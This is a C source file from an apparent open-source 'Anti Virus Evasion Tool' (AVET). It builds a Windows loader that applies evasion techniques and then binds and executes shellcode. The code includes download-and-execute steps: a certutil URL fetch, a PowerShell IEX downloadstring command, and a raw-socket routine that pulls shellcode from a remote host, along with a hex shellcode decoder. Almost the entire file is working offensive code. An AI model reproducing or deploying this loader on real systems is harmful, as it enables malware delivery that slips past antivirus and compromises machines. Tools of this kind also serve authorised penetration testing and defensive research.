/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"

#include "defs.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <tchar.h>
#ifdef DOWNLOADEXECSC
	#include "WinSock2.h"
	#include "Ws2tcpip.h"
#endif
#include <windows.h>


// Include shellcode binding technique to be used here
#include "shellcode_binding.h"

// Include shellcode retrieval method to be used here
#include "get_shellcode.h"


unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
#ifdef DOWNLOADEXECSC
unsigned char* downloadshellcode(char* uri);
#endif

int main (int argc, char **argv)
{		
	char *uvalue = NULL;	

	int index;
	int c;

	opterr = 0;	
		
	// Include evasion techniques to be used here
	#include "techniques.h"	
	
	// Retrieve shellcode	
	unsigned char *shellcode = get_shellcode(argv[1]);	
	
	// Bind and execute shellcode here
	// buf is defined in defs.h by make_avet and contains the shellcode	
	bind_shellcode(shellcode);
	

//#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
//download a file and write to disk
#ifdef DOWNLOADCERTUTIL
	char download[500];  //how not to do it...
	sprintf(download,"certutil.exe -urlcache -split -f %s",argv[2]);
	#ifdef PRINT_DEBUG
		printf("url: %s\n", download);
	#endif
	system(download);
	#ifdef PRINT_DEBUG
		printf("download done\n");
	#endif
#endif

#ifdef DOWNLOADPOWERSHELL
	char download[500];
	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadstring('%s'))\"",argv[2]);
	#ifdef PRINT_DEBUG
		printf("url: %s\n", download);
	#endif
	system(download);
#endif		

#ifdef UVALUE
	int size = strlen(UVALUE);
	uvalue=(char*)malloc(size);
	strcpy(uvalue,UVALUE);
#endif

/*
	// exec shellcode from a given file or from defs.h
	if (fvalue)
	{
		unsigned char *buffer;
		unsigned char *shellcode;
		int size;
//#ifndef FVALUE
#ifdef LVALUE
	#ifdef PRINT_DEBUG
		printf("exec shellcode from file\n");
	#endif
		size = get_filesize(fvalue);
		buffer = load_textfile(fvalue, buffer, size);
#endif
	#ifdef ENCRYPT 
		#ifdef PRINT_DEBUG
		printf ("size %d\n",size);
		//printf ("%s\n",FVALUE);
		printf("exec shellcode with decode_shellcode\n");
		#endif
		shellcode = decode_shellcode(buffer,shellcode,size);
	#endif

	#ifndef ENCRYPT
		#ifdef LVALUE
		unsigned char *buf = buffer; //that does the trick, although not nice. Needed for raw sc execution with -l
		#endif
	#ifndef ASCIIMSF 
	#ifndef DOWNLOADEXECSC
		#ifdef PRINT_DEBUG
		printf("exec shellcode without decode_shellcode\n");
		#endif
		shellcode = buf;
	#endif
	#endif
	#endif
	}
	
*/
	
	
	
	// exec from url
/*#ifdef UVALUE
	else if (uvalue)
	{
		#ifdef PRINT_DEBUG
			printf("exec shellcode from url\n");
		#endif

		char *sh_filename;
		sh_filename = ie_download(uvalue, sh_filename);
		int x=strlen(sh_filename);
		
#ifdef PRINT_DEBUG	
		printf("\n\n%d\n\n", x);
#endif

		unsigned char *buffer;
		unsigned char *shellcode;

		int size = get_filesize(sh_filename);
		buffer = load_textfile(sh_filename, buffer, size);
#ifdef ENCRYPT
		shellcode = decode_shellcode(buffer,shellcode,size);
#else
		shellcode = buf;
#endif
	}
#endif
*/

#ifdef DOWNLOADEXECSC
	unsigned char *shellcode = downloadshellcode(argv[1]);
#endif

	return 0;
}

#ifdef DOWNLOADEXECSC
//host=argv[1]
unsigned char* downloadshellcode(char* uri)
{
	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
	if (WSAStartup(MAKEWORD(2, 0), wd))
		exit(1);
	free(wd);
	SOCKET sock;
	
	char c;
	int i, j;
	char* file;
	char* host = uri;
	struct addrinfo* ai;
	struct addrinfo hints;
	char buf[512];

	//if (argc == 3) file = argv[2]; else 
	file = strrchr(uri, '/') + 1;
	if (strstr(uri, "http://") == uri) host += 7;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	sprintf(buf, "GET %s HTTP/1.1\r\n", uri);
	*strchr(host, '/') = '\0';
	if (i = getaddrinfo(host, "80", &hints, &ai)) exit(1); 
	sprintf(buf + strlen(buf), "Host: %s\r\n\r\n", host);
	sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
	if (connect(sock, ai->ai_addr, ai->ai_addrlen))
		exit(1);
	freeaddrinfo(ai);
	i = send(sock, buf, strlen(buf), 0);
	if (i < strlen(buf) || i == -1) exit(1);
	while (strcmp(buf, "\r\n")) {
		for (i = 0; strcmp(buf + i - 2, "\r\n"); i++) { recv(sock, buf + i, 1, 0); buf[i + 1] = '\0'; }
		if (strstr(buf, "HTTP/") == buf) {
			if (strcmp(strchr(buf, ' ') + 1, "200 OK\r\n")) exit(1);
		}
		if (strstr(buf, "Content-Length:") == buf) {
			*strchr(buf, '\r') = '\0';
			j = atoi(strchr(buf, ' ') + 1);
		}
	}

	unsigned char *sc=(char*)malloc(j * sizeof(char));
	for (i = 0; i < j; i++) 
	{ 
		recv(sock, &c, 1, 0); 
		sc[i]=c;
		//printf("%c",c);
	}

	closesocket(sock);
	WSACleanup();

	return sc;	
}
#endif

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
	int j=0;
	shellcode=malloc((size/2));

	#ifdef PRINT_DEBUG
		printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);
	#endif

	int i=0;
	do
	{
		unsigned char temp[3]={0};
		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
		shellcode[j] = strtoul(temp, NULL, 16);

		#ifdef PRINT_DEBUG
			printf("%x",shellcode[j]);
		#endif

		i+=2;
		j++;
	} while(i<size);

	#ifdef PRINT_DEBUG
		printf("\n ");
	#endif

	return shellcode;
}